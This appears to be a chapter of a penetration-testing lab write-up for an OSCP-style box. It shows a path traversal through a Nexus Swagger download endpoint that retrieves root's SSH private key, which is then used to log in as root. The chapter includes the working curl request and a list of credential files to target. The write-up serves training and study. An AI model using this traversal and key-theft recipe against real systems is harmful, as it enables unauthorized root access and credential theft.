# 05 — Nexus API → `id_rsa` → root on `192.168.91.110`

The low-privilege shell from chapter 04 is enough to *read* the Nexus installation. Nexus exposes a
Swagger UI on `8005`, the Swagger UI takes an API key, and one of its endpoints takes a **file path**
and returns the file. That is the whole privilege escalation: `path=../../../../root/.ssh/id_rsa`.

## 5.1 What the user shell already had

From chapter 04: `linpeas` on `192.168.91.110` reported `/opt/nexus/` files readable by the current
user but not world-readable, and a listener on **8005**. Reading the config from that shell is what
produces the API key:

```
/opt/nexus/nexus-3.x.x/etc/...
```

The API key comes from the Nexus configuration on disk, and it is what the Swagger **Authorize**
dialog wants.

> Path and value of that key: `[redacted]`. It is used in the Swagger **Authorize** dialog with
> `ApiKeyAuth (apiKey)` filled in.

## 5.2 The API is a Swagger UI on 8005

Browse to `http://192.168.91.110:8005` — the page is titled **“Nexus Platform API”** and is a plain
Swagger UI. Its **Authorize** dialog:

```
ApiKeyAuth (apiKey)
  API key authorization; the key is sent in a request header.
  Name:  [redacted]          ← header name
  In:    header
  Value: ********            ← the key from the config
                                                     [ Logout ]  [ Close ]
```

Once authorized, the request carries that header automatically.

## 5.3 The endpoint that reads files

Swagger lists `artifacts/download`. Its parameter is a path, and it is passed straight to a file read:

```
GET /service/rest/v1/search/artifacts/download?path=<path>
```

`curl` as Swagger renders it:

```bash
curl -X 'GET' \
  'http://192.168.91.110:8005/service/rest/v1/search/artifacts/download?path=../../../../root/.ssh/id_rsa' \
  -H 'accept: */*' \
  -H 'X-Nexus-...: <api-key>'
```

Swagger's own **Request URL** box, and the response:

```
Request URL
http://192.168.91.110:8005/service/rest/v1/search/artifacts/download?path=../../../../root/.ssh/id_rsa

Server response
Code: 200
Response body: Download file
Response headers:
  Content-Disposition: attachment; filename="id_rsa"
```

Clicking **Download file** saves the body — which is not an artifact at all:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
...
-----END OPENSSH PRIVATE KEY-----
```

## 5.4 Root

```bash
┌─[kali@kali]─[~/Desktop/oscp_exam/FIRST]
└──╼ $ chmod 600 id_rsa
┌─[kali@kali]─[~/Desktop/oscp_exam/FIRST]
└──╼ $ ssh -i id_rsa root@192.168.91.110
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-31-generic x86_64)
```

```
root@oscp:~# cd /root
root@oscp:~# cat proof.txt
2fa72f9ec5d211700b82e4799b22f********
root@oscp:~# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.91.110  netmask 255.255.255.0  broadcast 192.168.91.255
        ether 00:50:56:8a:14:a2  txqueuelen 1000  (Ethernet)
        RX packets 212462  bytes 173736149 (17.3 MB)
        RX errors 0  dropped 284  overruns 0  frame 0
        TX packets 13144  bytes 3537411 (3.5 MB)
        TX errors 0  dropped 0  overruns 0  carrier 0  collisions 0
```

**Flag masked.** Host is `oscp` (Ubuntu 24.04). The key was root's own key, so `ssh -i` lands
directly as root — no `sudo`, no exploit, no second stage.

## 5.5 The point of the box

If you can read files, go straight for the ones that matter: `/root/.ssh/id_rsa`, `/etc/shadow`,
service configuration with embedded keys. A `200` with the key as an attachment is the whole box;
the rest is `chmod 600` and `ssh -i`.

The trick is always the same: the readable path is hidden behind a feature that looks routine.

That last line is the whole trick: the endpoint is named `artifacts/download`, which sounds like it
serves repository artifacts. Nothing about the name suggests arbitrary file read, but the parameter
is a raw path and the app never normalises it. Two habits generalise:

1. **An “artifact/binary/file download” API is a file-read primitive.** Try `/etc/passwd` first, then
   the keys you actually want: `/root/.ssh/id_rsa`, `/root/.ssh/authorized_keys`, `/home/*/.ssh/id_rsa`.
2. **Root's SSH key is a shell.** When traversal gives you `id_rsa`, `chmod 600` and `ssh -i` — do not
   waste time decrypting `/etc/shadow`.

## 5.6 The Linux box in one line

```
WHOIS on :25 → sysad:sysad → IMAP → provisioning mail → SSH as <user> on .110
   → linpeas → readable /opt/nexus → API key → Swagger on :8005
   → artifacts/download?path=../../../../root/.ssh/id_rsa → root
```

Two hosts, one box: `.119` is the mail server that hands out credentials, `.110` is the application
server that hands out root.
